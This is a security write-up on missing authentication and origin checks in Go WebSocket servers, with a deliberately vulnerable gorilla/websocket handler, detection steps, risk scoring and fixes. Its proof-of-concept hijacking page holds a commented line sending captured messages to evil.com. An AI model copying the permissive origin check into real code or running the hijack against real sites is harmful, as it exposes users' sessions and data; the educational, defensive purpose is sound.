# **Golang Vulnerability Report: Unauthenticated WebSocket Connections**

## **Vulnerability Title**

No Authentication on WebSocket Connection

## **Severity Rating**

**High🟠 to Critical🔴**

The severity of unauthenticated WebSocket connections typically ranges from High to Critical. CVSS base scores for vulnerabilities involving unauthenticated access to WebSockets can be significant, often 7.5 or higher, depending on the impact. or instance, CVE-2024-54151, related to public WebSocket configurations allowing admin-level operations, received a CVSS score of 7.5 (High). Another example, CVE-2025-43855, where an unauthenticated user could crash a tRPC WebSocket server, was rated 8.7 (High) by GitHub, Inc..

The Datadog Cloud Security severity scoring framework categorizes attack vectors such as "No Authorization" (where no authentication is required to abuse a resource) as leading to "Highly Probable" likelihood scores. When combined with medium or high impact (e.g., unauthorized data access or service disruption), the overall severity is often High or Critical. The CISA Vulnerability Bulletin defines High severity as CVSS base scores of 7.0–10.0. Given that unauthenticated WebSockets can lead to unauthorized data access, command execution, and session hijacking, the potential impact is substantial.

## **Description**

A "No Authentication on WebSocket" vulnerability occurs when a Golang application establishes WebSocket connections without verifying the identity of the connecting client. WebSockets provide a full-duplex communication channel over a single TCP connection, initiated via an HTTP handshake. Unlike HTTP, which is stateless, WebSockets maintain a persistent connection, making them ideal for real-time applications. However, the WebSocket protocol (RFC 6455) itself does not mandate or provide built-in mechanisms for client authentication beyond the initial HTTP handshake. Consequently, the responsibility for implementing authentication falls entirely on the application developer. Failure to implement such checks allows any client, potentially malicious, to establish a WebSocket connection and interact with the server, leading to various security risks.

## **Technical Description (for security pros)**

In Golang applications, WebSocket connections are typically established by "upgrading" an HTTP connection. This upgrade process is handled by libraries such as `gorilla/websocket`, `nhooyr.io/websocket`, or the standard library's deprecated `net/websocket`. The vulnerability arises when the HTTP handler responsible for this upgrade does not perform adequate authentication checks before permitting the protocol switch.

During the initial HTTP handshake, the client sends an `Upgrade: websocket` header. The server, if it agrees to the upgrade, responds with a `101 Switching Protocols` status code. Authentication should occur at this HTTP handshake stage. Standard HTTP authentication mechanisms, such as session cookies, JWT bearer tokens in the `Authorization` header, or API keys, should be validated by the Golang server *before* the `upgrader.Upgrade()` (for `gorilla/websocket`) or `websocket.Accept()` (for `nhooyr.io/websocket`) method is called. If these checks are missing, any client that can reach the WebSocket endpoint can establish a connection.

A critical aspect often overlooked is the `Origin` header validation during the handshake. Browsers automatically include an `Origin` header in WebSocket handshake requests, indicating the origin of the script initiating the connection. If the server does not validate this header against an allowlist of trusted origins, the application becomes vulnerable to Cross-Site WebSocket Hijacking (CSWH). In a CSWH attack, a malicious website can initiate a WebSocket connection to the vulnerable server in the context of an authenticated user's browser session, effectively hijacking their session.

Many Golang WebSocket libraries provide mechanisms to check the origin. For instance, `gorilla/websocket` has an `Upgrader.CheckOrigin` function, which, if not configured properly (e.g., always returns `true`), bypasses this protection. The `nhooyr.io/websocket` library uses `AcceptOptions.OriginPatterns` for this purpose; misconfiguration, such as using overly permissive patterns or setting `AcceptOptions.InsecureSkipVerify = true`, can lead to the same vulnerability.

The absence of authentication means that once the WebSocket connection is established, the server has no reliable way to ascertain the client's identity or authorization level for subsequent messages exchanged over the persistent connection. This allows unauthenticated clients to send messages, potentially triggering actions or receiving data they are not authorized for.

## **Common Mistakes That Cause This**

Several common mistakes made by developers lead to unauthenticated WebSocket vulnerabilities in Golang applications:

1. **No Authentication Check Before Upgrade:** The most fundamental mistake is failing to integrate authentication checks within the HTTP handler that performs the WebSocket upgrade. Developers might assume the WebSocket library handles authentication or overlook this step entirely. The HTTP request that initiates the WebSocket handshake must be authenticated like any other sensitive HTTP request.
    
2. **Incorrect or Missing `Origin` Header Validation:** Failing to validate the `Origin` header or implementing a weak validation (e.g., allowing all origins) makes the application susceptible to Cross-Site WebSocket Hijacking (CSWH). This is a common oversight, especially when using libraries where default configurations might be insecure or when developers explicitly disable checks for convenience during development. For `nhooyr.io/websocket`, setting `AcceptOptions.InsecureSkipVerify = true` is a direct path to this vulnerability.
    
3. **Over-Reliance on Client-Side Controls:** Assuming that client-side code will behave as expected or that obscurity of the WebSocket endpoint provides security is a flawed approach. Attackers can bypass client-side controls and interact directly with the WebSocket endpoint.
4. **Misunderstanding WebSocket Protocol's Security Model:** A prevalent misconception is that the WebSocket protocol itself provides some form of authentication. The protocol is authentication-agnostic, delegating this responsibility to the application layer during the initial HTTP handshake.
    
5. **Insecure Token Transmission:** When using token-based authentication, passing tokens insecurely, such as directly in URL query parameters without adequate protection (e.g., short-lived, single-use tokens), can expose them through server logs or browser history. While TLS encrypts query parameters in transit, they are visible in server logs.

6. **Not Using Secure WebSockets (`wss://`):** Implementing WebSockets over unencrypted `ws://` connections exposes all transmitted data, including any potential authentication tokens sent post-handshake or sensitive application data, to man-in-the-middle attacks.
    
7. **Ignoring Library-Specific Security Configurations:** WebSocket libraries often have specific configurations for security. For example, `gorilla/websocket`'s `Upgrader` has a `CheckOrigin` field that developers must implement correctly. `nhooyr.io/websocket`'s `AcceptOptions` require careful setting of `OriginPatterns`. Using default or overly permissive settings can lead to vulnerabilities. The `gorilla/websocket` library is also now in a public archive state, meaning it may not receive security updates, which could be a risk if new vulnerabilities are found in the library itself.
    
8. **Lack of Session-Bound Authorization:** Even if an initial authentication occurs, failing to properly associate the WebSocket connection with the user's session and enforce authorization for messages sent over the WebSocket can lead to vulnerabilities.
9. **Implementing Custom, Flawed Authentication Post-Handshake:** Attempting to implement authentication by exchanging credentials *after* the WebSocket connection is established, rather than during the HTTP handshake, is more complex and prone to errors. This custom stateful protocol increases complexity and can lead to vulnerabilities like Denial of Service if unauthenticated connections tie up server resources.

## **Exploitation Goals**

Attackers exploit unauthenticated WebSocket connections with several objectives in mind, depending on the functionality and data exposed through the WebSocket:

1. **Unauthorized Data Access:** The primary goal is often to access sensitive information transmitted over the WebSocket. This could include private chat messages, real-time user data, financial information, system status, or any other data the application streams. In some cases, even metadata about connections or activity can be valuable.

2. **Session Hijacking (Cross-Site WebSocket Hijacking - CSWH):** If `Origin` validation is missing or weak, attackers aim to hijack legitimate user sessions. By tricking an authenticated user into visiting a malicious webpage, the attacker can initiate a WebSocket connection to the vulnerable application in the context of the victim's session. This allows the attacker to send and receive messages as the victim, effectively taking over their real-time interactions.

3. **Performing Unauthorized Actions:** Attackers may seek to send malicious messages through the WebSocket to trigger unauthorized actions on the server or affect other connected clients. This could range from posting messages as another user, modifying application state, executing administrative commands (if the WebSocket grants such privileges), or manipulating data. For example, a vulnerability in Directus allowed unauthenticated users to perform CRUD operations via WebSockets with admin privileges.

    
4. **Information Gathering/Reconnaissance:** Unauthenticated WebSockets can be used to gather information about the application's functionality, connected users, or internal systems. For instance, GraphQL introspection queries have been executed over unauthenticated WebSockets to dump the GraphQL schema.
    
5. **Denial of Service (DoS):** Attackers can flood the server with a large number of unauthenticated WebSocket connection attempts or messages, consuming server resources (CPU, memory, network bandwidth) and potentially leading to a denial of service for legitimate users. Some vulnerabilities allow crashing the server with malformed messages.

    
6. **Privilege Escalation:** If the WebSocket endpoint has privileged access or if an authentication bypass allows impersonating higher-privileged users, attackers can escalate their privileges within the application. CVE-2024-55591 involved escalating to super-admin privileges via WebSocket.
    
7. **Bypassing Security Controls:** WebSockets might be used to tunnel arbitrary TCP services or bypass other network security controls if not properly restricted.

The ultimate goal is to compromise the confidentiality, integrity, or availability of the application and its data, leveraging the real-time, persistent nature of WebSocket connections.

## **Affected Components or Files**

The vulnerability primarily affects server-side Golang code responsible for handling WebSocket connections. Specifically:

1. **HTTP Handlers for WebSocket Upgrades:** Any Golang `http.HandlerFunc` or `http.Handler` that is responsible for accepting an incoming HTTP request and upgrading it to a WebSocket connection. This is the primary point where authentication and `Origin` validation should occur.
    - Example path: `func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request)`
2. **WebSocket Libraries Usage:**
    - **`gorilla/websocket`:** Code that uses `websocket.Upgrader{}` and its `Upgrade()` method. The `CheckOrigin` function within the `Upgrader` configuration is critical.
        
    - **`nhooyr.io/websocket`:** Code that uses `websocket.Accept()` and its `AcceptOptions`. The `OriginPatterns` and `InsecureSkipVerify` fields in `AcceptOptions` are key security points.

        
    - **`net/websocket` (standard library, deprecated):** Older codebases might still use this package. Its lack of advanced features and active maintenance makes it a less secure choice generally.
        
3. **Application Logic Processing WebSocket Messages:** Any backend code that receives, processes, or acts upon messages sent by clients over established WebSocket connections. If the connection is unauthenticated, this logic is processing untrusted input.
4. **Session Management Code (or lack thereof for WebSockets):** If the application uses HTTP session management (e.g., cookies), the WebSocket upgrade handler must correctly integrate with this system to associate the WebSocket connection with an authenticated user session.
5. **Configuration Files:** Application or server configuration files that might define WebSocket endpoint paths, security settings, or origin policies, if such configurations influence the behavior of the Go code.

Essentially, any Go file that imports and utilizes WebSocket libraries to create server-side WebSocket endpoints is potentially affected if secure coding practices for authentication and origin validation are not followed. The vulnerability is not tied to specific file names but rather to the functional code blocks implementing WebSocket handling.

## **Vulnerable Code Snippet**

The following Golang code snippet demonstrates a vulnerable WebSocket handler using the `gorilla/websocket` library. It lacks proper authentication checks before upgrading the HTTP connection and has a permissive `CheckOrigin` function, making it vulnerable to direct unauthenticated access and Cross-Site WebSocket Hijacking (CSWH).

```Go

package main

import (
	"log"
	"net/http"

	"github.com/gorilla/websocket"
)

// Configure the upgrader
// Vulnerability 1: Permissive CheckOrigin allows connections from any origin (CSWH risk)
var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		// In a production environment, you should validate the origin.
		// Returning true here for demonstration purposes makes it vulnerable.
		log.Printf("Allowing connection from origin: %s", r.Header.Get("Origin"))
		return true // This allows all origins!
	},
}

// Define a simple message structure (for demonstration)
type Message struct {
	Type string `json:"type"`
	Text string `json:"text"`
}

func handleConnections(w http.ResponseWriter, r *http.Request) {
	// Vulnerability 2: No authentication check before upgrading.
	// Any client can reach this point and attempt to upgrade.
	// Example: Check for a valid session cookie or JWT token here.
	// if!isAuthenticated(r) {
	//  http.Error(w, "Unauthorized", http.StatusUnauthorized)
	//  return
	// }

	// Upgrade initial GET request to a WebSocket
	ws, err := upgrader.Upgrade(w, r, nil)
	if err!= nil {
		log.Printf("Failed to upgrade connection: %v", err)
		return
	}
	// Make sure we close the connection when the function returns
	defer ws.Close()

	log.Println("Client connected")

	// Simple echo server logic
	for {
		var msg Message
		// Read in a new message as JSON and map it to a Message object
		err := ws.ReadJSON(&msg)
		if err!= nil {
			log.Printf("Error reading json: %v", err)
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("Unexpected close error: %v", err)
			}
			break // Exit loop on error (e.g., client disconnected)
		}

		log.Printf("Received: Type=%s, Text=%s", msg.Type, msg.Text)

		// Echo the message back to the client
		err = ws.WriteJSON(msg)
		if err!= nil {
			log.Printf("Error writing json: %v", err)
			break
		}
	}
}

func main() {
	http.HandleFunc("/ws-chat", handleConnections)
	log.Println("HTTP server started on :8080")
	err := http.ListenAndServe(":8080", nil)
	if err!= nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
```

/*
To run this example:
1. Save as main.go
2. go mod init vulnerable-ws
3. go get github.com/gorilla/websocket
4. go run main.go

To test vulnerability (direct unauthenticated connection):
Use a WebSocket client (e.g., wscat, browser console) to connect to ws://localhost:8080/ws-chat

To test CSWH:
1. Ensure you are "logged in" (conceptually, have a session cookie for localhost:8080 if this app had login).
2. Create an attacker.html page on a different origin and try to connect.
   The permissive CheckOrigin will allow it.
*/`

**Explanation of Vulnerabilities in the Snippet:**

1. **Permissive `CheckOrigin`:** The `upgrader.CheckOrigin` function is set to `return true`. This explicitly allows WebSocket connections from any origin, which is a direct prerequisite for Cross-Site WebSocket Hijacking (CSWH) attacks. A secure implementation would validate `r.Header.Get("Origin")` against an allowlist of trusted domains.
    
2. **Missing Authentication Before Upgrade:** The `handleConnections` function calls `upgrader.Upgrade(w, r, nil)` without first verifying the identity or session of the client making the HTTP request. There are no checks for session cookies, API tokens in headers (e.g., `Authorization`), or any other authentication mechanism. This allows any unauthenticated client to establish a WebSocket connection.

A similar vulnerability pattern would exist if using `nhooyr.io/websocket` with `websocket.Accept(w, r, &websocket.AcceptOptions{InsecureSkipVerify: true})` or with overly broad `OriginPatterns` and no preceding authentication check in the HTTP handler.

## **Detection Steps**

Detecting "No Authentication on WebSocket" vulnerabilities in Golang applications involves a combination of manual code review, dynamic analysis, and potentially the use of security scanning tools.

1. Manual Code Review:

This is often the most effective way to identify the lack of authentication.

- Identify WebSocket Handlers: Locate all HTTP handlers in the Golang codebase that are responsible for upgrading connections to WebSockets. Look for usage of upgrader.Upgrade() (from gorilla/websocket) 20, websocket.Accept() (from nhooyr.io/websocket) 10, or similar functions from other libraries.
- Check for Authentication Logic: Within these handlers, verify that robust authentication checks are performed before the WebSocket upgrade call. This includes validating session cookies, JWTs from Authorization headers, API keys, or other credentials. The absence of such checks is a strong indicator of the vulnerability.
- Verify Origin Header Validation:
- For gorilla/websocket, inspect the CheckOrigin function in the websocket.Upgrader configuration. Ensure it doesn't trivially return true or have overly permissive logic. It should compare the request's Origin header against a strict allowlist of expected domains.8
- For nhooyr.io/websocket, examine the AcceptOptions passed to websocket.Accept(). Check if InsecureSkipVerify is true (vulnerable) or if OriginPatterns are too broad or missing.10
- Review Use of wss://: Ensure that WebSocket connections are intended to be established over TLS (wss://). While this is a client-side initiation, server-side configuration should support and prefer it.
- Examine Post-Handshake Logic: If authentication is attempted after the handshake (less ideal), scrutinize this custom logic for flaws.

2. Dynamic Analysis / Penetration Testing:

- Direct Connection Attempts:
- Identify WebSocket endpoints (e.g., from client-side JavaScript, API documentation, or network traffic analysis).
- Use a WebSocket client tool (e.g., wscat 4, Postman, browser developer console, or custom scripts) to attempt connections to these endpoints without providing any authentication credentials (cookies, tokens).
- If the connection is successful (server responds with HTTP 101) and messages can be exchanged, the endpoint is likely unauthenticated.
- Cross-Site WebSocket Hijacking (CSWH) Testing:
- If an application uses cookie-based authentication for HTTP sessions, test for CSWH.
- Create a malicious HTML page hosted on a different origin (or opened as a local file).
- Embed JavaScript in this page to initiate a WebSocket connection to the target application's WebSocket endpoint.
- If the user is authenticated to the target application in their browser, the browser will automatically send session cookies with the cross-origin WebSocket handshake request.
- If the server lacks proper Origin header validation, the connection will be established, allowing the malicious page to send/receive WebSocket messages on behalf of the victim.5
- Manipulating Handshake Headers: Attempt to connect with various Origin headers or without an Origin header to test the server's validation logic.

3. Security Scanning Tools:

- Web application security scanners like Burp Suite 4 or OWASP ZAP 5 can assist in detecting WebSockets and testing them. These tools can intercept WebSocket traffic, allow modification of messages, and may have specific modules or extensions for WebSocket security testing, including checks for Origin validation.
- Specialized WebSocket testing tools like STEWS can also be used.4
- Cloud-specific tools might detect misconfigurations. For example, Google Cloud Run documentation mentions deploying services with --allow-unauthenticated, which could apply to WebSocket endpoints if not further secured within the application logic.22

4. Review Server Logs:

- Examine server logs for WebSocket connection attempts. Look for successful connections from unexpected IP addresses or origins, or a lack of authentication-related log entries for WebSocket upgrades. However, logging might not always be detailed enough to conclusively identify the vulnerability without other tests.

5. Check for Publicly Known Vulnerabilities:

- If using third-party systems or frameworks that expose WebSockets (e.g., Directus 1), check for CVEs related to unauthenticated WebSocket access in those specific products.

Successful detection often involves combining these methods. For example, code review might identify a potentially weak `Origin` check, which is then confirmed through dynamic CSWH testing.

## **Proof of Concept (PoC)**

This section provides step-by-step instructions to demonstrate the "No Authentication on WebSocket" vulnerability, covering both direct unauthenticated access and Cross-Site WebSocket Hijacking (CSWH). Assume the vulnerable Golang server from the "Vulnerable Code Snippet" section is running on `http://localhost:8080` with the WebSocket endpoint at `/ws-chat`.

**PoC 1: Direct Unauthenticated Connection**

- **Goal:** Show that a client can connect and interact with the WebSocket endpoint without any prior authentication.
- **Prerequisites:**
    - The vulnerable Golang WebSocket server is running.
    - A WebSocket client tool like `wscat` is installed ( `npm install -g wscat` ), or use browser developer console.
- **Steps:**
    1. **Attempt Connection:**
    Open a terminal and use `wscat` to connect to the vulnerable endpoint:
    
    Alternatively, in a browser's developer console (on any page, as origin check is permissive):
    
        ```Bash
        
        wscat -c ws://localhost:8080/ws-chat`
        
        **JavaScript**
        
        `const socket = new WebSocket('ws://localhost:8080/ws-chat');
        socket.onopen = () => console.log('Connected!');
        socket.onmessage = (event) => console.log('Received:', event.data);
        socket.onerror = (error) => console.error('Error:', error);
        ```
        
    2. **Observe Connection:**
    If the connection is successful, `wscat` will show `Connected (press CTRL+C to quit)` or the browser console will log "Connected!". This indicates the server accepted the connection without any authentication credentials.
    3. **Send a Message:**
    In `wscat`, type a JSON message and press Enter:
    
    In the browser console, after connection:

        `{"type": "message", "text": "Hello from unauthenticated wscat"}`
    
        ```JavaScript
        socket.send(JSON.stringify({ type: "message", text: "Hello from unauthenticated browser" }));
        ```
        
    4. **Observe Server Logs and Client Response:**
        - The Golang server logs should show "Client connected" and "Received: Type=message, Text=Hello from unauthenticated...".
        - The `wscat` client or browser console should receive the echoed message back from the server (e.g., `> {"type":"message","text":"Hello from unauthenticated wscat"}`).
- **Expected Outcome:** The attacker successfully connects, sends, and receives messages via the WebSocket without providing any authentication. This confirms the lack of authentication at the handshake.

**PoC 2: Cross-Site WebSocket Hijacking (CSWH)**

- **Goal:** Demonstrate that a malicious website can establish a WebSocket connection to the vulnerable endpoint in the context of a victim's browser session (if the application used cookie-based sessions and the victim was logged in). Since our example doesn't have login, this PoC will primarily demonstrate the lack of Origin validation.
- **Prerequisites:**
    - The vulnerable Golang WebSocket server is running.
    - A web browser.
- **Steps:**
    1. **Create Malicious HTML Page (`attacker.html`):**
    Create an HTML file with the following content. This page will be hosted on a different origin (e.g., opened from the local filesystem `file:///path/to/attacker.html` or hosted on `http://evil.com`).
    
        ```HTML
        
        <!DOCTYPE **html**>
        <html>
        <head>
            <title>CSWH PoC</title>
        </head>
        <body>
            <h1>CSWH Attack Page</h1>
            <script>
                console.log('Attempting CSWH attack...');
                // Target the vulnerable WebSocket endpoint
                const ws = new WebSocket('ws://localhost:8080/ws-chat');
        
                ws.onopen = function() {
                    console.log('CSWH: WebSocket connection opened successfully from different origin!');
                    // Send a message as if it's the victim user
                    ws.send(JSON.stringify({ type: "cswh_message", text: "Message sent via CSWH!" }));
                    // If the application had session cookies, this message would be processed
                    // in the context of the victim's session.
                };
        
                ws.onmessage = function(event) {
                    console.log('CSWH: Received message:', event.data);
                    // Attacker could exfiltrate this data to their server, e.g.:
                    // fetch('http://evil.com/log?data=' + encodeURIComponent(event.data));
                };
        
                ws.onerror = function(error) {
                    console.error('CSWH: WebSocket error:', error);
                };
        
                ws.onclose = function() {
                    console.log('CSWH: WebSocket connection closed');
                };
            </script>
            <p>If you see 'CSWH: WebSocket connection opened successfully' in the console, the CSWH attack (due to missing Origin check) is successful.</p>
        </body>
        </html>
        ```
        
    2. **Simulate Victim Access:**
    Imagine a victim user is logged into `http://localhost:8080` (if it had authentication). For this PoC, simply having the server running is enough to test the Origin check.
    3. **Victim Visits Malicious Page:**
    Open `attacker.html` in the web browser.
    4. **Observe Browser Console and Server Logs:**
        - Open the browser's developer console on the `attacker.html` page. You should see:
            - `Attempting CSWH attack...`
            - `CSWH: WebSocket connection opened successfully from different origin!`
            - `CSWH: Received message: {"type":"cswh_message","text":"Message sent via CSWH!"}` (if the server echoes)
        - The Golang server logs will show a connection established and the message received, noting the origin if logged (e.g., `null` for `file:///` or `http://evil.com`). The key is that the `CheckOrigin` function in the vulnerable code returned `true`, allowing this cross-origin connection.

            
- **Expected Outcome:** The `attacker.html` page, served from a different origin, successfully establishes a WebSocket connection to `ws://localhost:8080/ws-chat` and can send/receive messages. This demonstrates the CSWH vulnerability due to the permissive `CheckOrigin` configuration. If the application relied on session cookies for authentication, this hijacked connection would operate with the victim's privileges.

These PoCs provide tangible evidence of the "No Authentication on WebSocket" vulnerability and its exploitability through direct connection and CSWH.

## **Risk Classification**

The risk posed by unauthenticated WebSockets is assessed using the OWASP Risk Rating Methodology, which considers both Likelihood and Impact factors. The overall risk can vary depending on the specific application context, the sensitivity of data exchanged, and the actions that can be performed via the WebSocket.

Likelihood Factors:

The likelihood of an unauthenticated WebSocket vulnerability being discovered and exploited can be estimated as follows:

- **Threat Agent Factors:**
    - *Skill Level:* Ranges from "Some technical skills" (3) for basic connection to "Network and programming skills" (6) for crafting CSWH exploits.
    - *Motive:* "Possible reward" (4) if exploiting for minor disruption or data, to "High reward" (9) if critical data or actions are accessible.
    - *Opportunity:* "Some access or resources required" (7) (network access to the endpoint) to "No access or resources required" (9) if the endpoint is publicly exposed and easily discoverable.
    - *Size:* "Anonymous Internet users" (9) if the endpoint is public and widely known.
- **Vulnerability Factors:**
    - *Ease of Discovery:* "Easy" (7) as WebSocket endpoints can often be found in client-side JavaScript or by monitoring network traffic. Automated tools might also identify them (9).
    - *Ease of Exploit:* "Easy" (5) for direct unauthenticated connections using standard tools. CSWH might be "Difficult" (3) to "Easy" (5) depending on the attacker's setup. Automated tools for common patterns could exist (9).
    - *Awareness:* This type of vulnerability is "Obvious" (6) to "Public knowledge" (9) within the security community.
    - *Intrusion Detection:* Often "Logged without review" (8) or "Not logged" (9), as WebSocket traffic may not receive the same level of scrutiny as standard HTTP traffic.

**Overall Likelihood:** Averaging these factors typically results in a **Medium to High** likelihood.

Impact Factors:

The impact of exploiting an unauthenticated WebSocket:

- **Technical Impact:**
    - *Loss of Confidentiality:* Can range from "Minimal critical data disclosed" (6) to "Extensive critical data disclosed" (7) or even "All data disclosed" (9) if highly sensitive information (PII, financial data, private communications) is transmitted.
        
    - *Loss of Integrity:* From "Minimal seriously corrupt data" (3) if minor actions are possible, to "Extensive seriously corrupt data" (7) or "All data totally corrupt" (9) if attackers can modify critical data or execute significant unauthorized actions.

    - *Loss of Availability:* "Minimal primary services interrupted" (5) if individual connections can be disrupted or minor DoS, to "Extensive primary services interrupted" (7) if the entire WebSocket service or dependent services can be taken down.

    - *Loss of Accountability:* "Possibly traceable" (7) if some indirect logs exist, to "Completely anonymous" (9) for actions performed over a truly unauthenticated channel.
- **Business Impact (Examples):**
    - *Financial Damage:* Could range from minor to "Significant effect on annual profit" (7) or worse, depending on the nature of the data/actions.
    - *Reputation Damage:* "Loss of major accounts" (4) or "Loss of goodwill" (5) to "Brand damage" (9) if a significant breach occurs.
    - *Non-Compliance:* "Clear violation" (5) to "High profile violation" (7) of data protection regulations (e.g., GDPR, CCPA) if PII is compromised.
    - *Privacy Violation:* Affecting "Hundreds of people" (5) to "Millions of people" (9).

**Overall Impact:** Depending on the application, the impact is typically **Medium to Critical**.

Overall Risk Calculation:

Using the OWASP risk matrix 23, the overall risk is determined by combining likelihood and impact:

- High Likelihood * High Impact = **CRITICAL**
- High Likelihood * Medium Impact = **HIGH**
- Medium Likelihood * High Impact = **HIGH**
- Medium Likelihood * Medium Impact = **MEDIUM**

Given the potential for significant data exposure, unauthorized actions, and session hijacking, "No Authentication on WebSocket" is generally classified as a **High** or **Critical** risk.

**Associated Common Weakness Enumerations (CWEs):**

- **CWE-287:** Improper Authentication

- **CWE-306:** Missing Authentication for Critical Function
    
- **CWE-346:** Origin Validation Error (specifically relevant for CSWH)
- **CWE-862:** Missing Authorization (often a consequence if authentication is missing)
- **CWE-863:** Incorrect Authorization

**Table: OWASP Risk Rating for Unauthenticated WebSocket (Example Scenario: Financial Trading Platform)**

| **Factor Category** | **Factor** | **Selected Level (Score)** | **Justification for Financial Trading Platform** |
| --- | --- | --- | --- |
| **Threat Agent** | Skill Level | Advanced (6) | Requires understanding of WebSockets, financial protocols. |
|  | Motive | High Reward (9) | Potential for direct financial gain, market manipulation. |
|  | Opportunity | Some Access (7) | Public endpoint, but exploitation might require specific timing/knowledge. |
|  | Size | Anonymous Users (9) | If endpoint is internet-facing. |
| **Vulnerability** | Ease of Discovery | Easy (7) | Endpoints often in client JS; financial APIs are targets. |
|  | Ease of Exploit | Easy (5) | Direct connection is easy; exploiting specific financial actions might be more complex. |
|  | Awareness | Public Knowledge (9) | WebSocket vulnerabilities are well-documented. |
|  | Intrusion Detection | Logged w/o Review (8) | Financial transactions logged, but specific WebSocket misuse might be missed. |
| **Likelihood Score** |  | **7.5 (High)** | Average of above scores. |
| **Technical Impact** | Loss of Confidentiality | Extensive Critical (7) | Exposure of trade secrets, account balances, PII. |
|  | Loss of Integrity | Extensive Serious (7) | Unauthorized trades, account manipulation. |
|  | Loss of Availability | Extensive Primary (7) | Disruption of trading services. |
|  | Loss of Accountability | Completely Anon (9) | Difficult to trace unauthorized trades if no auth. |
| **Business Impact** | Financial Damage | Bankruptcy (9) | Large-scale fraud or market manipulation could be catastrophic. |
|  | Reputation Damage | Brand Damage (9) | Loss of trust in a financial platform is severe. |
|  | Non-Compliance | High Profile (7) | Violations of financial regulations (e.g., SEC, FINRA). |
|  | Privacy Violation | Thousands (7) | Exposure of many users' financial data. |
| **Impact Score** |  | **7.75 (High)** | Average of above scores (considering technical impact more directly, business impact as context). |
| **Overall Risk** | **Likelihood (7.5) * Impact (7.75)** |  | (Calculated as High * High) = **CRITICAL** |

This table illustrates how the risk can be contextually assessed. For a less sensitive application, the impact scores might be lower, leading to an overall High or Medium risk.

## **Fix & Patch Guidance**

Remediating the "No Authentication on WebSocket" vulnerability in Golang applications requires implementing robust security measures at the HTTP handshake phase and maintaining secure practices throughout the WebSocket lifecycle. A multi-layered approach, often referred to as defense in depth, is crucial.

1. **Implement Robust Authentication Before WebSocket Upgrade:**
    - This is the most critical step. In the Golang HTTP handler that manages the WebSocket upgrade request, verify the client's identity *before* calling `upgrader.Upgrade()` (for `gorilla/websocket`) or `websocket.Accept()` (for `nhooyr.io/websocket`).
        
    - Utilize standard HTTP authentication mechanisms:
        - **Session Cookies:** If the application uses session cookies for user authentication, validate the cookie and ensure an active, authenticated session exists.
        - **JWT Tokens:** If using JWTs, extract the token from the `Authorization` header (e.g., `Bearer <token>`), validate its signature, expiration, and claims.
        - **API Keys:** For M2M or third-party integrations, validate API keys passed in headers.
    - If authentication fails, respond with an appropriate HTTP error code (e.g., `http.StatusUnauthorized` (401) or `http.StatusForbidden` (403)) and **do not proceed with the WebSocket upgrade**.
2. **Enforce Strict `Origin` Header Validation:**
    - To prevent Cross-Site WebSocket Hijacking (CSWH), rigorously validate the `Origin` header in the HTTP handshake request against an allowlist of expected, trusted origins.
        
    - For `gorilla/websocket`: Implement a custom `CheckOrigin` function for the `websocket.Upgrader`. This function should compare `r.Header.Get("Origin")` against the allowlist. Do not simply return `true`.
        
        ```Go
        
        var upgrader = websocket.Upgrader{
            CheckOrigin: func(r *http.Request) bool {
                origin := r.Header.Get("Origin")
                // Example: Allow connections from "https://yourapp.com"
                // In a real app, this list might come from configuration.
                allowedOrigins :=string{"https://yourapp.com", "https://admin.yourapp.com"}
                for _, allowed := range allowedOrigins {
                    if origin == allowed {
                        return true
                    }
                }
                log.Printf("Origin %s not allowed", origin)
                return false
            },
        }
        ```
        
    - For `nhooyr.io/websocket`: Use the `AcceptOptions.OriginPatterns` field. Provide a list of specific host patterns (e.g., `example.com`). Avoid using `AcceptOptions.InsecureSkipVerify = true`.

        ```Go
        
        opts := &websocket.AcceptOptions{
            OriginPatterns:string{"yourapp.com", "admin.yourapp.com"},
            // Subprotocols:string{"json"}, // Optional
        }
        conn, err := websocket.Accept(w, r, opts)
        ```
        
    - Do not use wildcard origins () unless the implications are fully understood and mitigated by other strong controls.
3. **Use Secure WebSockets (`wss://`):**
    - Always mandate the use of TLS for WebSocket connections by using the `wss://` scheme. This encrypts data in transit, protecting it from eavesdropping and tampering. Ensure your server is configured with a valid TLS certificate.

4. **Secure Token-Based Authentication Strategies (if not using cookies):**
    - If session cookies are not suitable (e.g., non-browser clients, different domains), use dedicated tokens for WebSocket authentication.
    - **Transmission:** Pass these tokens securely during the handshake, typically in an HTTP header (e.g., `Authorization` or a custom header). Avoid passing long-lived tokens in URL query parameters due to logging risks.

    - **Ephemeral Tokens:** Consider using short-lived, single-use tokens obtained via a secure, authenticated HTTP POST request specifically for initiating the WebSocket connection. This token is then used in the handshake.
        
    - **Token Properties:** Ensure tokens have sufficient entropy (at least 128 bits) and are generated using cryptographically secure random number generators, as per OWASP ASVS 13.5.4.
        
5. **Principle of Least Privilege:**
    - Once a WebSocket connection is authenticated, ensure that the connection only has access to the data and functionalities appropriate for the authenticated user's role and permissions. Do not grant broad access by default.
6. **Implement Rate Limiting and Resource Management:**
    - Protect against DoS attacks by implementing rate limiting on connection attempts and messages per connection. Manage server resources carefully to handle concurrent connections.
        
7. **Regularly Update Libraries and Golang:**
    - Keep Golang, WebSocket libraries (`gorilla/websocket` users should be especially cautious as it's archived ), and other dependencies updated to patch known vulnerabilities.
        
8. **Input Validation for WebSocket Messages:**
    - Treat all data received over WebSocket connections as untrusted input. Validate and sanitize messages to prevent injection attacks or other exploits targeting the message processing logic.
    
The following table summarizes common authentication strategies for Golang WebSockets:

**Table: Golang WebSocket Authentication Strategies**

| **Strategy** | **Golang Implementation Notes (Key Libraries/Packages)** | **Pros** | **Cons** | **CSWH Mitigation** |
| --- | --- | --- | --- | --- |
| **HTTP Session Cookie** | Read and validate cookie using `r.Cookie("session_id")` and session store (e.g., `gorilla/sessions`) before WebSocket upgrade. | Leverages existing web session management; transparent to client-side JS if same-origin. | Only works if WebSocket server is on the same domain (or subdomains with appropriate cookie scope). Vulnerable to CSWH if `Origin` not checked. | **Crucial:** Strict `Origin` header validation against an allowlist. |
